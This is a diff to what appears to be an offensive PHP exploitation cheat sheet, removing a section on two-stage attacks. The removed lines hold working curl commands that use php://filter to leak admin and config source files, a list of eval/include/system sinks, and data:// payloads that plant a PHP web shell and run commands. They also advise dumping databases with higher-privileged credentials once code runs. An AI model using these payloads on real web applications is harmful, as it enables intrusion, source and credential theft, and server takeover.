@@ -267,45 +267,6 @@ fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
 | Mail log | Send email with PHP in body → include mail log | `mail()` or SMTP access |
 | **PHP filter chain RCE** | `php://filter/convert.iconv.UTF8.CSISO2022KR|...` (generated chain) | Full control of `include()` path, no `file_exists()` |
 
-### PHP Filter Source Disclosure → eval/include Sink RCE (two-stage)
-
-A common archetype on PHP web apps with admin/debug parameters: stage-1 reads source via `php://filter`, stage-2 finds an `eval`/`include` sink in the disclosed source, then RCE via `data://`. Even when the UI text says **"this option is for developers only"** or **"requires authentication"** — TEST IT. Decorative warning text is not a guard; the parameter often reaches the sink without any check.
-
-**Stage 1 — read source files:**
-```bash
-# Disclose any PHP file's source as base64. The wrapper bypasses `include` because
-# the filter returns text, not PHP, so the include doesn't execute the file.
-curl 'http://target/admin/?file=php://filter/convert.base64-encode/resource=admin/index.php' | base64 -d
-curl 'http://target/admin/?file=php://filter/convert.base64-encode/resource=admin/master.php' | base64 -d
-curl 'http://target/admin/?file=php://filter/convert.base64-encode/resource=../config.php' | base64 -d
-curl 'http://target/admin/?file=php://filter/convert.base64-encode/resource=../../../../inetpub/wwwroot/web.config' | base64 -d
-# Try common admin/controller filenames: index, master, dashboard, config,
-# database, settings, login, auth, debug, dev, test
-```
-
-**Stage 2 — locate the sink in the disclosed source, then RCE:**
-```php
-// Common sinks to grep for after decoding:
-eval($_POST['x']);                              // direct eval
-eval(file_get_contents($_POST['include']));     // file_get_contents → eval (very common)
-include($_GET['file']);                         // include
-include $_REQUEST['x'];                         // bare include
-assert($_POST['x']);                            // assert (PHP < 8)
-preg_replace('/.../e', $_POST['x'], $subject);  // /e modifier (PHP < 7)
-system($_POST['cmd']); exec(...); shell_exec(...); passthru(...);
-```
-```bash
-# Stage-2 RCE via data:// against the eval(file_get_contents(...)) sink:
-PAYLOAD=$(echo '<?php system($_GET["c"]); ?>' | base64 -w0)
-curl 'http://target/admin/master.php?c=whoami' \
-  --data-urlencode "include=data://text/plain;base64,${PAYLOAD}"
-
-# Or against include($_GET['file']):
-curl 'http://target/admin/?file=data://text/plain;base64,'$(echo '<?php system("whoami"); ?>' | base64 -w0)
-```
-- The "decorative-text-not-a-guard" rule: any UI string like `"For developers only"`, `"Internal use"`, `"Disabled in production"` is NOT a check — the parameter usually still reaches the sink. Test the param directly with `php://filter` first to confirm reachability.
-- After RCE, immediately re-dump tables/configs through the new context: the web-app DB user is rarely the highest-priv account on the box. The admin controller's connection string (in the disclosed source) usually points at a `db_admin`/`sa`-like user that can read tables the public app couldn't.
-
 ### PHP Filter Chain RCE (Controlled Include Path)
 
 When you **fully control** the `include()`/`require()` path (e.g., via an HTTP header or parameter that directly sets the include target), use **PHP filter chain generation** to synthesize arbitrary PHP code:
